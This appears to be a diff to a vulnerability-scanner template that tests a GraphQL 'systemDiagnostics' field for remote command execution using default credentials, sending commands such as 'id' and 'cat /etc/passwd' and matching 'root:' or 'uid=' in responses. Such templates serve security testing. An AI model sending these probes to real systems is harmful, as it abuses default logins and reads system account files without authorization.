@@ -19,7 +19,7 @@ role_selector:
 graphql:
   - query: |
       {
-        systemDiagnostics(username: "admin", password: "admin", cmd: "id")
+        systemDiagnostics(username: "admin", password: "changeme", cmd: "id")
       }
     matchers:
       - type: status
@@ -31,34 +31,22 @@ graphql:
 
   - query: |
       {
-        systemDiagnostics(username: "admin", password: "admin", cmd: "whoami")
+        systemDiagnostics(username: "admin", password: "changeme", cmd: "cat /etc/passwd")
       }
     matchers:
       - type: status
         status: [200]
       - type: word
-        words: ["data", "systemDiagnostics"]
+        words: ["root:"]
         part: body
-
-  - query: |
-      {
-        systemDiagnostics(username: "admin", password: "admin", cmd: "cat /etc/passwd")
-      }
-    matchers:
-      - type: status
-        status: [200]
-      - type: word
-        words: ["root:", "systemDiagnostics"]
-        part: body
-        condition: or
 
 detection:
   success_indicators:
-    - type: status_code
-      status_code: 200
     - type: body_field
       body_field: "data.systemDiagnostics"
       exists: true
+    - type: regex_match
+      pattern: "(uid=|root:)"
     - type: body_field
       body_field: "errors"
       exists: false
